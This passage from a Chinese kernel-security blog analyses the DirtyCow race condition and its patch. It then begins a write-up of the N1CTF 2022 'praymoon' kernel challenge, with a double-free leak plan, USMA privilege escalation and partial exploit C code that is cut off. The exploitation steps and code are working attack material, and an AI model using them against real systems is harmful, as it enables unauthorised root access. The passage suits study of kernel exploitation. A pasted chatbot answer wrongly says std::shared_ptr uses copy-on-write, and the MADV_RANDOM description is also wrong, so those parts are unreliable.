only，而访问的flags中要求写，因此会返回NULL。\n>\n> 于是再次进入`faultin_page()`函数处理，发现是因为页表写导致的错误，于是执行写时复制（或复用之前的匿名页），然后将flags中的FOLL_WRITE清除。表示映射正常返回，后续可以强制往该页写（`/proc/self/mem`就是这么任性，只不过写的是匿名页，只在程序运行内存中有表现，不会同步回磁盘文件）。\n\n第二次进入`follow_page_mask()`函数：\n\n```c\nfollow_page_mask(vma, start, foll_flags, &page_mask);\n  pgd_offset(mm, address);\n  pud_offset(pgd, address);\n  pmd_offset(pud, address);\n  follow_page_pte(vma, address, pmd, flags);\n    pte_offset_map_lock(mm, pmd, address, &ptl);\n    pte_present(pte);\t\t\t// 第二次进时，由于上一次faultin_page中设置了页表项并且页被加载到内存中，所以会进入如下判断\n    if ((flags & FOLL_WRITE) && !pte_write(pte)) {\t\t//虽然flags中有FOLL_WRITE标记位，但页表项中却是RO，无法通过检查，因此返回NULL\n\t\tpte_unmap_unlock(ptep, ptl);\n\t\treturn NULL;\n\t}\n```\n\n返回为NULL，触发`faultin_page()`处理：\n\n```c\nfaultin_page(tsk, vma, start, &foll_flags, nonblocking);\n  handle_mm_fault(mm, vma, address, fault_flags);\n    __handle_mm_fault(mm, vma, address, flags);\n      pgd_offset(mm, address);\n      pud_alloc(mm, pgd, address);\n      pmd_alloc(mm, pud, address);\n      pte_alloc(mm, pmd, address)\n      pte_offset_map(pmd, address);\t\t\t\n      handle_pte_fault(mm, vma, address, pte, pmd, flags);\n        /* if (flags & FAULT_FLAG_WRITE) {\n\t\tif (!pte_write(entry))\n\t\t\treturn do_wp_page(mm, vma, address,pte, pmd, ptl, entry);\n\t\t\t// 由于此时页表中标记位PRESENT=1，DIRTY=1，RDONLY=1，所以进入do_wp_page()函数处理流程 */\n\t\tdo_wp_page(mm, vma, address, pte, pmd, ptl, entry);\t\t\n\t\t  vm_normal_page(vma, address, orig_pte);\n\t\t  if (PageAnon(old_page) && !PageKsm(old_page)) \t// 由于do_cow_fault产生的是匿名页面，因此会进入该if分支\n          reuse_swap_page(old_page, &total_mapcount)\n\t\t  wp_page_reuse(mm, vma, address, page_table, ptl, orig_pte, old_page, 0, 0);\n\t\t    pte_mkyoung(orig_pte);\n\t\t    maybe_mkwrite(pte_mkdirty(entry), vma);\n\t\t    return VM_FAULT_WRITE;\n\t\t\t// 由于对应VMA只读, 因此只会给PTE设置一个Dirty标志, 而不会设置RW标志, 然后返回一个VM_FAULT_WRITE（表示内核可以写入这个页）\n      // ......一路返回到faulin_page()函数中\n  if ((ret & VM_FAULT_WRITE) && !(vma->vm_flags & VM_WRITE))\n\t\t*flags &= ~FOLL_WRITE;\n\treturn 0;\n  // 重点来了，如果vma->vm_flags没有VM_WRITE权限，则将flags中的FOLL_WRITE清除 \n```\n\n`do_cow_fault()`函数返回0，回到__get_user_pages()函数中的retry标签处，再次执行`follow_page_mask()`。但这次，flags中的FOLL_WRITE已经被清除了，相当于一个读请求。于是，正常情况下`follow_page_mask()`此时就会返回刚刚操作过的匿名映射的页面，后续用户对该页面的写不会同步到磁盘文件中。正常来说这个功能是没什么问题的。\n\n但是！！如果此时有另一个线程出现，使用 `madvise(addr, len, MADV_DONTNEED)` 释放目标页面，并清空页表项，后续就会以FOLL_RAED再走一次`follow_page_mask()` -> `faultin_page` -> `follow_page_mask()` -> 返回page cache映射的页面（也就是说写的内容会被同步到磁盘文件中）。回到`__access_remote_vm()`中，调用`kmap()`映射返回的页面，由于write标志为1，进入`copy_to_user_page()`，将需要写入的内容写到只读文件中。\n\n接下来，我们分析一下目标页面被`madvise()`释放后的过程\n\n## 第三次\n\n> 假设第三次进入`follow_page_mask()`函数前，address对应的物理页被释放且对应的页表项被清空了。而flags中没有POLL_WRITE，会进入读错误的缺页错误处理过程。这个过程不会产生匿名页面，直接将page_cache映射到虚拟内存空间，后续的读写会同步回磁盘文件（这就是漏洞导致的问题所在）。\n\n第三次进入`follow_page_mask()`函数：\n\n```c\nfollow_page_mask(vma, start, foll_flags, &page_mask);\n  pgd_offset(mm, address);\n  pud_offset(pgd, address);\n  pmd_offset(pud, address);\n  follow_page_pte(vma, address, pmd, flags);\n  \tpte_offset_map_lock(mm, pmd, address, &ptl);\n  \tpte_present(pte);\t\t\t// 第三次进时，由于madivse操作将页表清空了，页不在内存中，且页表项为空，会直接返回NULL\n  \tif (!pte_none(pte))\n\t\treturn NULL;\n```\n\n返回为NULL，触发`faultin_page()`处理：\n\n```c\nfaultin_page(tsk, vma, start, &foll_flags, nonblocking);\n  handle_mm_fault(mm, vma, address, fault_flags);\n    __handle_mm_fault(mm, vma, address, flags);\n      pgd_offset(mm, address);\n      pud_alloc(mm, pgd, address);\n      pmd_alloc(mm, pud, address);\n      pte_alloc(mm, pmd, address)\n      pte_offset_map(pmd, address);\n      handle_pte_fault(mm, vma, address, pte, pmd, flags);\n        do_fault(mm, vma, address, pte, pmd, flags, entry);\n\t\t  // 由于flags中的WRITE标记没了，于是会进入do_read_fault()\n    \t  do_read_fault(mm, vma, address, pmd, pgoff, flags, orig_pte);\n  \t\t  // do_read_fault将文件内容读取到vmf->page页面（page cache），并为此物理页面建立与缺页地址的映射关系。返回0\n```\n\n\n\n## 第四次\n\n> `follow_page_mask()`返回获取到的物理页面给上层函数，不会再进入缺页处理函数。\n\n回到`__get_user_pages()`函数中的retry标签处，再次执行`follow_page_mask()`，这次就能获得page_cache对应的页面，对其写是会直接同步到文件中的。\n\n```c\nfollow_page_mask(vma, start, foll_flags, &page_mask);\n  pgd_offset(mm, address);\n  pud_offset(pgd, address);\n  pmd_offset(pud, address);\n  follow_page_pte(vma, address, pmd, flags);\n  \tpte_offset_map_lock(mm, pmd, address, &ptl);\n  \tpte_present(pte);\t\t\t// 第四次进时，由于页在内存中，于是获取页面并返回\n  \tpage = vm_normal_page(vma, address, pte);\n```\n\n\n\n## 最终\n\n紧接着，返回到`__access_remote_vm()`函数中，通过`kmap()`映射绕过mmap映射的读写限制，完成强制写内存。（不幸的是，由于条件竞争漏洞的存在，这个内存写会被同步到磁盘文件中）\n\n```c\n\t\tret = get_user_pages_remote(tsk, mm, addr, 1, write, 1, &page, &vma);\t\t// 获取虚拟地址addr对应的物理页面page\n\t\tif (ret <= 0) {\n\t\t\t// ...\n\t\t} else {\n\t\t\t// ...\n\t\t\tmaddr = kmap(page);\t\t// 用于相对短时间的映射，只能映射单个page。\n\t\t\tif (write) {\n\t\t\t\tcopy_to_user_page(vma, page, addr, maddr + offset, buf, bytes);\t\t// 将buf内容（用户态传入的数据）写入page cache\n\t\t\t\tset_page_dirty_lock(page);\t\t// 因为是写，所以将page设置为脏（dirty bit），表示需要写回到文件\n\t\t\t} else {\n\t\t\t\tcopy_from_user_page(vma, page, addr,\n\t\t\t\t\t\t    buf, maddr + offset, bytes);\n\t\t\t}\n            kunmap(page);\n\t\t\tput_page(page);\n            // ...\n```\n\n后续同步时，就会将page cache修改过的内容写回到磁盘文件中去。（？具体的写回时机是？）\n\n\n\n## 总结\n\n精简一下流程，方便回头来看的时候快速理解。\n\n正常调用流程：\n\n```c\nfollow_page_mask()\t\t// 页未映射，返回NULL\n\t⬇\nfaultin_page()\t\t\t// 将文件内容读到page cache，并cow一个匿名页面（RO）\n\t⬇\nfollow_page_mask()\t\t// 由于访问属性flags中有FOLL_WRITE，而匿名页面只读。权限不匹配，返回NULL\n\t⬇\nfaultin_page()\t\t\t// 一顿处理，知道是匿名页面，所以删除了flags中有FOLL_WRITE\n\t⬇\t\t\nfollow_page_mask()\t\t// 没了FOLL_WRITE后，权限检查通过，成功获取到匿名页面page\n\t⬇\n返回上一级函数\t\t\t\t// 上一级函数对这个匿名页面通过kmap做写操作，不会影响到磁盘文件\n```\n\ndirtycow调用流程：\n\n```c\nfollow_page_mask()\t\t// 页未映射，返回NULL\n\t⬇\nfaultin_page()\t\t\t// 将文件内容读到page cache，并cow一个匿名页面（RO）\n\t⬇\nfollow_page_mask()\t\t// 由于访问属性flags中有FOLL_WRITE，而匿名页面只读。权限不匹配，返回NULL\n\t⬇\nfaultin_page()\t\t\t// 一顿处理，知道是匿名页面，所以删除了flags中有FOLL_WRITE\n\t⬇\t\t// ***假设另一个线程在这里释放了匿名页面，并清空了页表项\nfollow_page_mask()\t\t// 页为映射，返回NULL （注意，此时flags中没有了FOLL_WRITE，编程了一个读请求）\n\t⬇\nfaultin_page()\t\t\t// 针对读请求，直接将page cache跟请求的虚拟地址做映射\n\t⬇\nfollow_page_mask()\t\t// 成功返回page cache\n\t⬇\n返回上一级函数\t\t\t\t// 上一级函数对page cache通过kmap做写操作，会改写磁盘文件内容\n```\n\n\n\n# 复现环境\n\n在[linux4.6](https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.6.tar.gz)编译的内核下复现成功，一个原本只读的文件被普通用户修改成功。\n\n- 写入字符串的长度如果大于文件大小，最多只能写入文件大小个字符\n- 官方exp中for循环设置了100000000次，很慢。测试了一下，我的环境里改成100000也能打成，会快很多。\n\n![image-20230425175820639](image-20230425175820639.png?size=600)\n\n\n\n# 漏洞修复\n\npatch：[**mm: remove gup_flags FOLL_WRITE games from __get_user_pages()**](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619)\n\n```diff\ndiff --git a/include/linux/mm.h b/include/linux/mm.h\nindex e9caec6a51e97..ed85879f47f5f 100644\n--- a/include/linux/mm.h\n+++ b/include/linux/mm.h\n@@ -2232,6 +2232,7 @@ static inline struct page *follow_page(struct vm_area_struct *vma,\n #define FOLL_TRIED\t0x800\t/* a retry, previous pass started an IO */\n #define FOLL_MLOCK\t0x1000\t/* lock present pages */\n #define FOLL_REMOTE\t0x2000\t/* we are working on non-current tsk/mm */\n+#define FOLL_COW\t0x4000\t/* internal GUP flag */\n \n typedef int (*pte_fn_t)(pte_t *pte, pgtable_t token, unsigned long addr,\n \t\t\tvoid *data);\ndiff --git a/mm/gup.c b/mm/gup.c\nindex 96b2b2fd0fbd1..22cc22e7432f6 100644\n--- a/mm/gup.c\n+++ b/mm/gup.c\n@@ -60,6 +60,16 @@ static int follow_pfn_pte(struct vm_area_struct *vma, unsigned long address,\n \treturn -EEXIST;\n }\n \n+/*\n+ * FOLL_FORCE can write to even unwritable pte's, but only\n+ * after we've gone through a COW cycle and they are dirty.\n+ */\n+static inline bool can_follow_write_pte(pte_t pte, unsigned int flags)\n+{\n+\treturn pte_write(pte) ||\n+\t\t((flags & FOLL_FORCE) && (flags & FOLL_COW) && pte_dirty(pte));\n+}\n+\n static struct page *follow_page_pte(struct vm_area_struct *vma,\n \t\tunsigned long address, pmd_t *pmd, unsigned int flags)\n {\n@@ -95,7 +105,7 @@ retry:\n \t}\n \tif ((flags & FOLL_NUMA) && pte_protnone(pte))\n \t\tgoto no_page;\n-\tif ((flags & FOLL_WRITE) && !pte_write(pte)) {\n+\tif ((flags & FOLL_WRITE) && !can_follow_write_pte(pte, flags)) {\n \t\tpte_unmap_unlock(ptep, ptl);\n \t\treturn NULL;\n \t}\n@@ -412,7 +422,7 @@ static int faultin_page(struct task_struct *tsk, struct vm_area_struct *vma,\n \t * reCOWed by userspace write).\n \t */\n \tif ((ret & VM_FAULT_WRITE) && !(vma->vm_flags & VM_WRITE))\n-\t\t*flags &= ~FOLL_WRITE;\n+\t        *flags |= FOLL_COW;\n \treturn 0;\n }\n```\n\npatch中，增加了一个`FOLL_COW`的属性和一些检查。当第二次因为 \"页表权限和访问权限不匹配\" 进入`faultin_page()`处理时，不再清除`FOLL_WRITE`属性，而是给flags加上一个`FOLL_COW`的属性。这样第三次进入`follow_page_mask()`时仍然带着`FOLL_WRITE`，避免了条件竞争引起的写page cache。\n\n# 参考资料\n\n- [CVE-2016-5195 DirtyCow:Linux内核提权漏洞分析](https://atum.li/2016/10/25/dirtycow/)\n\n- [奔跑吧linux内核2.18小节](https://xuanxuanblingbling.github.io/assets/attachment/%E5%A5%94%E8%B7%91%E5%90%A7-linux%E5%86%85%E6%A0%B8-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-DirtyCow.pdf)\n\n- [pin memory与get_user_pages()函数](https://zhuanlan.zhihu.com/p/579444153)\n\n- [页表管理-linux页目录项获取相关函数分析](https://blog.csdn.net/weixin_38537730/article/details/104252794)：实际上64位linux中还有个PUD，多了一层\n\n\n\n# 知识点\n\n## copy-on-write机制\n\n先看一下wiki上对[Copy-on-write](https://en.wikipedia.org/wiki/Copy-on-write)的解释：\n\nCopy-on-write(COW)是计算机编程中一种资源管理技术，它提高了“可更改资源”的复制效率。如果一个资源需要被复制，但暂时不会被更改，那么就没必要创建一个新的资源，而是让“复制品”和\"原件\"共享同一个资源。但如果后续对该资源的使用过程中，需要对其进行更改（如写操作）时，就必须创建一个新资源（复制一份）。也就是copy-on-write（写时拷贝）名字的意义，在进行写操作时才真正执行复制的操作。\n\n在虚拟内存管理中，copy-on-write在fork系统调用的实现中有所体现，用于父子进程间虚拟内存的共享。通常，创建一个新进程时，父子进程的内存空间有大量相同的内容，如果为子进程创建一个跟父进程同样大小的内存空间，是非常浪费的行为，这时copy-on-write机制就能很好地发挥作用。\n\ncopy-on-write机制的实现可以很简单，在页表上标记某个内存页面为只读，并记录当前物理页面的引用数（在struct page中）。当内核监控到有对这个页面写的请求时，就新申请一个物理页面，将原数据拷贝过来（对于引用计数为1的情况，无需申请新页面）。更新页表指向新申请的物理页面，对原物理页面的引用计数减1，然后执行写操作。\n\n另外，在内存分配中也可以使用copy-on-write机制。在系统中保留一个内容全为0的物理页面，当进程申请内存时，把这个物理页面映射给进程，并将其标记为copy-on-write。这样，只有当进程有写操作时，才需要为其分配物理内存，让进程拥有的虚拟内存空间大于实际的物理内存空间。\n\n关于它的应用场景，我问了一下chatgpt，觉得它回答得挺好的，直接贴上来了。（感觉以后写博客都可以交给它了hhhh）\n\nCopy-On-Write（COW）机制在操作系统和编程语言中有多种应用场景。以下是一些常见的应用场景和方法：\n\n1. 进程复制：在Linux中，当一个进程使用fork()系统调用创建一个子进程时，子进程会共享父进程的地址空间。使用COW机制可以避免不必要的内存复制，从而提高进程创建的效率和性能。\n2. 文件系统：在文件系统中，COW技术可以用于实现写时复制（Copy-On-Write）的快照。在写时复制快照中，当文件被修改时，仅会复制发生变化的数据块，而不是整个文件。这可以节省存储空间，并提高快照的创建和恢复速度。\n3. 内存分配：在编程语言中，COW机制可以用于实现共享内存。例如，在C++中，std::shared_ptr类使用COW技术来实现多个指针共享同一个对象的内存。当一个指针尝试修改共享内存时，COW机制会创建一个新的拷贝，以避免对其他指针的影响。\n4. 数据库：在数据库中，COW技术可以用于实现多版本并发控制（MVCC）。在MVCC中，每个事务可以看到数据库的一个快照。当事务修改数据时，COW机制会创建一个新的版本，以避免对其他事务的影响。\n\n这些只是COW机制的一些常见应用场景和方法，它还可以用于其他许多领域，例如虚拟内存、网络协议栈等。\n\n\n\n## mmap\n\nmmap是一个非常常用的系统调用（在libc中封装成了mmap函数），它可以将文件或设备映射到进程的虚拟内存空间。当我们需要对文件或设备进行读写操作时，通常需要将它们读取到内存中，然后进行操作，最后再写回到文件或设备中。这个过程需要使用大量的系统调用和数据传输，非常繁琐和耗时。而将文件或设备映射到进程的虚拟地址空间中，可以将文件或设备的数据直接映射到进程的内存中，这样就可以直接在内存中进行读写操作，大大提高了读写效率。\n\nmmap系统调用被封装成了一个libc的函数，函数定义如下：\n\n```c\n#include <sys/mman.h>\nvoid *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);\n```\n\n- void *addr：指定映射区域在进程中的起始地址，通常传入NULL，让内核自动分配。\n- size_t length：指定映射区域的大小。\n- int prot：指定映射区域的访问权限，常用的有可读`PROT_READ`、可写`PROT_WRITE`、可执行`PROT_EXEC`等。\n- int flags：指定映射区域的映射方式，比如私有映射`MAP_PRIVATE`、共享映射`MAP_SHARED`、匿名映射`MAP_ANONYMOUS`、固定映射`MAP_FIXED`等。\n- int fd：指定需要映射的文件描述符，如果指定映射方式是匿名映射，则为-1。\n- off_t offset：指定从文件或设备的哪个位置开始映射数据。\n\nmmap函数返回一个指向映射区域的指针，如果映射失败，则返回MAP_FAILED。\n\n该漏洞利用重点需要关注映射方式MAP_PRIVATE。\n\n> MAP_PRIVATE：私有映射。将文件或设备映射到进程的虚拟地址空间中，并创建一个进程私有的映射区域。这样，进程可以在这个映射区域中进行读写操作，而不会影响原始文件或设备。当进程对映射区域进行修改时，内核会将这些修改写入到一个新的私有页面中，而不会影响原始文件或设备。这个标志必须与PROT_READ结合使用。\n\n简单来说，MAP_PRIVATE标志会建立一个写入时拷贝（copy-on-write）的私有映射，内存区域的写入不会影响到原文件。\n\n尝试用不同的open属性和mmap属性来操作测试文件，得到如下结果：\n\n| open     | mmap                              | result                                     |\n| -------- | --------------------------------- | ------------------------------------------ |\n| O_RDWR   | PROT_READ\\|PROT_WRITE,MAP_PRIVATE | 写操作不会报错，但内容无法同步到磁盘文件   |\n| O_RDWR   | PROT_READ\\|PROT_WRITE,MAP_SHARED  | 写的内容将同步到磁盘文件中                 |\n| O_RDWR   | PROT_READ，MAP_PRIVATE            | 尝试往映射区写入时程序崩溃                 |\n| O_RDWR   | PROT_READ，MAP_SHARED             | 尝试往映射区写入时程序崩溃                 |\n| O_RDONLY | PROT_READ\\|PROT_WRITE,MAP_PRIVATE | 可以映射成功，但写的内容不会同步到磁盘文件 |\n| O_RDONLY | PROT_READ\\|PROT_WRITE,MAP_SHARED  | 无法映射成功，mmap报错Permission denied    |\n\n\n\n## madvise\n\nmadvise（memory advise）是一个系统调用，可以用于向内核提供关于进程虚拟地址空间的一些提示，以帮助内核优化内存使用和性能。\n\nmadvise被封装成libc函数，其原型如下：\n\n```c\n#include <sys/mman.h>\nint madvise(void *addr, size_t length, int advice);\n```\n\n其中，addr是进程虚拟地址空间的起始地址，length是需要提供提示的内存区域的大小，advice是提示类型，常见的提示类型有以下几种：\n\n- MADV_NORMAL：默认行为，不提供任何提示。\n- MADV_RANDOM：该区域将被随机访问，建议内核预读取相邻的页。\n- MADV_SEQUENTIAL：该区域将被顺序访问，建议内核预读取整个区域。\n- MADV_WILLNEED：该区域将被访问，建议内核预读取整个区域。\n- MADV_DONTNEED：该区域不再需要，建议内核释放相应的物理内存（页表项将被置空）。\n\n\n\n## /proc/self/mem文件\n\n`/proc/<pid>/`目录下有许多特殊的文件，如`/proc/self/maps`可以看到查看进程虚拟地址空间映射的情况，`/proc/self/mem`对应当前进程的虚拟地址空间（可以直接对虚拟地址空间进行读写）。\n\n如下所示代码片段，最终value的输出结果是\"999\"。\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <fcntl.h>\n#include <unistd.h>\n\nint main() {\n    int value = 123;\n    int evil = 999;\n    int fd = open(\"/proc/self/mem\", O_RDWR);\n    if (fd == -1) {\n        perror(\"open\");\n        exit(-1);\n    }\n    if (lseek(fd, (off_t)&value, SEEK_SET) == -1) {\n        perror(\"lseek\");\n        exit(-1);\n    }\n    if (write(fd, &evil, sizeof(evil)) != sizeof(evil)) {\n        perror(\"write\");\n        exit(-1);\n    }\n\tclose(fd);\n    \n    printf(\"value = %d\\n\", value);\n    return 0;\n}\n```\n\n\n\n## 问题讨论\n\n- 为什么不直接对mmap的页用write写，而是使用/proc/self/mem？\n\n  我的理解：因为对`/proc/self/mem`写入时，内核空间处理有调用kmap函数，映射目标物理页面到内核（pte是可写的），对目标页面读写。所以原本用户不可写的内存区域（pte是只读的），也可写入。而write或memcpy函数对应的内核处理流程中，如果发现往只读内存写，就会产生segmentation fault。\n","categories":["经典内核漏洞复现"]},{"title":"N1CTF 2022 praymoon","url":"/2023/04/01/230401-n1ctf2022-pwn-praymoon/","content":"\n\n\n# 漏洞分析\n\n题目附件：[praymoon.zip](praymoon.zip)\n\n系统版本：linux5.18.10，开启KASLR、SMEP、SMAP、KPTI防护措施。\n\n```bash\n$ cat run.sh \n#!/bin/sh\nqemu-system-x86_64 \\\n    -m 128M \\\n    -kernel ./bzImage \\\n    -initrd ./rootfs.cpio \\\n    -monitor /dev/null \\\n    -append \"root=/dev/ram console=ttyS0 oops=panic panic=1 quiet kaslr\" \\\n    -cpu kvm64,+smep,+smap\\\n    -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\\n    -nographic \\\n    -no-reboot\n\n/ $ uname -a\nLinux (none) 5.18.10 #7 SMP PREEMPT_DYNAMIC Tue Nov 1 19:07:02 UTC 2022 x86_64 GNU/Linux\n/ $ cat /sys/devices/system/cpu/vulnerabilities/*\nProcessor vulnerable\nMitigation: PTE Inversion\nVulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown\nMitigation: PTI\nNot affected\nVulnerable\nMitigation: usercopy/swapgs barriers and __user pointer sanitization\nMitigation: Retpolines, STIBP: disabled, RSB filling\nNot affected\nNot affected\n```\n\n再看漏洞ko：只有一个ioctl接口，并且代码量不大。add_flag初始值是1，进0x5555分支可以有一次kmalloc的机会，申请的堆大小为0x200（512字节）。del_flag初始值是2，进0x6666分支可以有两次kfree的机会，所以这里是个double free的漏洞。\n\n```c\n__int64 __fastcall seven_ioctl(file *filp, unsigned int cmd, unsigned __int64 arg)\n{\n  __int64 v4; // rdi\n\n  if ( cmd == 0x5555 )\n  {\n    if ( add_flag <= 0 )\n      return 0LL;\n    v4 = kmalloc_caches[9];\n    --add_flag;\n    moon = (char *)kmem_cache_alloc_trace(v4, 3520LL, 512LL);\n    printk(&unk_1F2, 3520LL);\n    return 0LL;\n  }\n  else if ( cmd == 0x6666 )\n  {\n    if ( moon )\n    {\n      if ( del_flag <= 0 )\n        return 0LL;\n      --del_flag;\n      kfree(moon, cmd, arg);\n      printk(&unk_202, cmd);\n      return 0LL;\n    }\n    // ...\n  }\n  // ...\n}\n```\n\n因此，漏洞点非常明显，一个0x200（kmalloc-512）大小的double free，出题人并无意在此为难我们。题目给出如下编译选项：\n\n```\nCONFIG_SLAB_FREELIST_RANDOM=y\nCONFIG_SLAB_FREELIST_HARDENED=y\nCONFIG_SHUFFLE_PAGE_ALLOCATOR=y\n\nCONFIG_STATIC_USERMODEHELPER=y\nCONFIG_STATIC_USERMODEHELPER_PATH=\"\"\n\nCONFIG_MEMCG=y\nCONFIG_MEMCG_SWAP=y\nCONFIG_MEMCG_KMEM=y\n\nCONFIG_DEBUG_LIST=y\n\nCONFIG_HARDENED_USERCOPY=y\n```\n\n\n\n# 漏洞利用 - USMA\n\n常用的几个内核结构体大小都不是0x200，目前已知的非固定大小结构体有msg_msg和user_key_payload。\n\n[msg_msg的申请](https://elixir.bootlin.com/linux/v5.18.10/source/ipc/msgutil.c#L46) 带了`GFP_KERNEL_ACCOUNT`标志（会独立存在），而漏洞ko在申请内存时未使用该标志，因此它们的堆是隔离开的，无法构成利用。\n\n```c\n// 为msg_msg和用户数据申请内存\n__int64 __fastcall load_msg(__int64 a1, unsigned __int64 a2)\n{\n\t// ... \n  \tv5 = _kmalloc(v3 + 0x30, 0x400CC0LL);\n    // ...\n}\n\n// 漏洞ko的内存申请\n__int64 __fastcall seven_ioctl(file *filp, unsigned int cmd, unsigned __int64 arg)\n{\n\t// ... \n    moon = (char *)kmem_cache_alloc_trace(v4, 0xDC0LL, 0x200LL);\n\t// ...\n}\n\n// add_key\n__int64 __fastcall _x64_sys_add_key(_QWORD *a1)\n{\n\t// ... \n        v14 = kvmalloc_node(v1, 0xCC0, -1);\n    // ...\n}\n// 为user_key_payload和用户数据申请内存\n__int64 __fastcall user_preparse(_QWORD *a1)\n{\n\t// ...\n  \tv2 = _kmalloc(v1 + 0x18, 0xCC0LL);\n    // ...\n}\n```\n\nuser_key_payload中有datalen长度信息，利用double free（UAF）漏洞结合userfaultfd+setxattr可以改掉datalen，于是通过keyctl操作可以越界读取堆上的内容，泄露内核地址。\n\n后续的提权使用USMA。\n\n利用思路简化成下图步骤：\n\n![IMG_0415.png](IMG_0415.png?size=600)\n\n1. ko malloc\n2. ko free\n3. add_key malloc：user_key_payload占住堆块\n4. ko free \n5. setxattr malloc：改掉user_key_payload的datalen，结合userfaultfd，延迟释放\n6. keyctl read：越界读取堆上的内容，泄露内核基址\n7. keyctl revoke：释放user_key_payload占用的堆块\n8. packet socket：alloc_pg_vec()中kcalloc时占住堆块（USMA）\n9. setxattr free：延迟的释放\n10. setxattr malloc：第一次申请的不一定是目标堆块，因此结合userfaultfd多做几次申请（USMA）\n11. 通过mmap，改内核代码段逻辑，如`_sys_setresuid`，让普通用户可以通过`setresuid(0, 0, 0);`获得root权限。（USMA）\n\n完整exp如下：\n\n```c\n// gcc usma-leak-exp.c -lpthread -static -o exp\n#define _GNU_SOURCE\n#include <sched.h>\n#include <stdio.h>\n#include <ctype.h>\n#include <sys/socket.h>\n#include <sys/mman.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <fcntl.h>\n#include <string.h>\n#include <stdint.h>\n#include <sys/ioctl.h>\n#include <sys/xattr.h>\n#include <sys/syscall.h>\n#include <linux/userfaultfd.h>\n#include <poll.h>\n#include <pthread.h>\n#include <arpa/inet.h>\n#include <linux/if_packet.h>\n#include <net/ethernet.h>\n#include <net/if.h>\n#include <linux/keyctl.h>\n\nint fd_seven;\nchar* addr;\nchar* aaa;\nuint64_t kernel_base = 0;\n\nuint64_t timer_expire_func = 0xffffffff81abd380;\nuint64_t crypto_larval_destroy = 0xFFFFFFFF8143E280;\n\n#define BZIMAGE_ADDR 0xFFFFFFFF81000000\n\n#define COLOR_GREEN \"\\033[32m\"\n#define COLOR_RED \"\\033[31m\"\n#define COLOR_YELLOW \"\\033[33m\"\n#define COLOR_DEFAULT \"\\033[0m\"\n\n#define logd(fmt, ...) dprintf(2, \"[*] %s:%d \" fmt \"\\n\", __FILE__, __LINE__, ##__VA_ARGS__)\n#define logi(fmt, ...) dprintf(2, COLOR_GREEN \"[+] %s:%d \" fmt \"\\n\" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)\n#define logw(fmt, ...) dprintf(2, COLOR_YELLOW \"[!] %s:%d \" fmt \"\\n\" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)\n#define loge(fmt, ...) dprintf(2, COLOR_RED \"[-] %s:%d \" fmt \"\\n\" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)\n#define die(fmt, ...)                      \\\n    do {                                   \\\n        loge(fmt, ##__VA_ARGS__);          \\\n        loge(\"Exit at line %d\", __LINE__); \\\n        exit(1);                           \\\n    } while (0)\n\n\n#ifndef PAGE_SIZE\n#define PAGE_SIZE (0x1000)\n#endif\n\n#ifndef HEXDUMP_COLS\n#define HEXDUMP_COLS 16\n#endif\n\nvoid hexdump(void *mem, unsigned int len) {\n    putchar('\\n');\n    for(int i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++) {\n        /* print offset */\n        if(i % HEXDUMP_COLS == 0) {\n            printf(\"0x%06x: \", i);\n        }\n\n        /* print hex data */\n        if(i < len) {\n            printf(\"%02x \", 0xFF & ((char*)mem)[i]);\n        }\n        /* end of block, just aligning for ASCII dump */\n        else {        \n            printf(\"   \");\n        }\n\n        /* print ASCII dump */\n        if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) {\n            for(int j = i - (HEXDUMP_COLS - 1); j <= i; j++) {\n                 /* end of block, not really printing */\n                if(j >= len) {\n                    putchar(' ');\n                }\n                /* printable char */\n                else if(isprint(((char*)mem)[j])) {\n                    putchar(0xFF & ((char*)mem)[j]);\n                }\n                 /* other char */\n                else {\n                    putchar('.');\n                }\n            }\n            putchar('\\n');\n        }\n    }\n    putchar('\\n');\n}\n\nvoid init_namespace(void) {\n    int fd;\n    char buff[0x100];\n\n    uid_t uid = getuid();\n    gid_t gid = getgid();\n\n    if (unshare(CLONE_NEWUSER | CLONE_NEWNS)) {\n        die(\"unshare(CLONE_NEWUSER | CLONE_NEWNS): %m\");\n    }\n\n    if (unshare(CLONE_NEWNET)) {\n        die(\"unshare(CLONE_NEWNET): %m\");\n    }\n\n    fd = open(\"/proc/self/setgroups\", O_WRONLY);\n    snprintf(buff, sizeof(buff), \"deny\");\n    write(fd, buff, strlen(buff));\n    close(fd);\n\n    fd = open(\"/proc/self/uid_map\", O_WRONLY);\n    snprintf(buff, sizeof(buff), \"0 %d 1\", uid);\n    write(fd, buff, strlen(buff));\n    close(fd);\n\n    fd = open(\"/proc/self/gid_map\", O_WRONLY);\n    snprintf(buff, sizeof(buff), \"0 %d 1\", gid);\n    write(fd, buff, strlen(buff));\n    close(fd);\n}\n\n\n#ifndef ETH_P_ALL\n#define ETH_P_ALL 0x0003\n#endif\n\nvoid packet_socket_rx_ring_init(int s, unsigned int block_size,\n                                unsigned int frame_size, unsigned int block_nr,\n                                unsigned int sizeof_priv, unsigned int timeout) {\n    int v = TPACKET_V3;\n    int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));\n    if (rv < 0) {\n        die(\"setsockopt(PACKET_VERSION): %m\");\n    }\n\n    struct tpacket_req3 req;\n    memset(&req, 0, sizeof(req));\n    req.tp_block_size = block_size;\n    req.tp_frame_size = frame_size;\n    req.tp_block_nr = block_nr;\n    req.tp_frame_nr = (block_size * block_nr) / frame_size;\n    req.tp_retire_blk_tov = timeout;\n    req.tp_sizeof_priv = sizeof_priv;\n    req.tp_feature_req_word = 0;\n\n    rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));\n    if (rv < 0) {\n        die(\"setsockopt(PACKET_RX_RING): %m\");\n    }\n}\n\nint packet_socket_setup(unsigned int block_size, unsigned int frame_size,\n                        unsigned int block_nr, unsigned int sizeof_priv, int timeout) {\n    int 